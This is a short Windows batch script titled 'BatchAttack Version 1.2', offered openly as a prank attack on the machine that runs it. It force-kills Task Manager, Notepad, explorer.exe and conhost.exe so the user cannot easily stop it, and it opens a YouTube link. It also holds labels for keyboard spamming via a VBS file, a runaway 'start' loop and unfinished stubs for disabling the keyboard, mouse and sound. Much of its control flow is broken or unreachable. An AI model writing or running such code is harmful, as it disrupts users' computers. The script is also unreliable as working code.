@echo off
title BatchAttack Version 1.2 by SleekZ

echo Are you sure you want to run BatchAttack? The author is NOT responsible for any damage done to this machine!
pause
cls
echo Last chance!
pause   
cls
echo Loading BatchAttack. . .
ping localhost -n 1 >nul
ping localhost -n 2 >nul
goto :BigTing





:BigTing
goto :anticlose


goto :anticlose
:anticlose
taskkill /f /im taskmgr.exe
taskkill /f /im notepad.exe
taskkill /f /im explorer.exe
taskkill /f /im conhost.exe

goto :shrek
goto :Keyboardspam
goto :keyboarddisabler
goto :mousedisabler
goto :looper
goto :end

timeout /t 5
goto 

:loop 
start 
goto loop



:Keyboardspam
start key.vbs
:keyboarddisabler
echo Feature not complete!
:mousedisabler
echo Feature not complete!
:soundspam
echo Feature not complete!

:shrek
start https://www.youtube.com/watch?v=pxw-5qfJ1dk








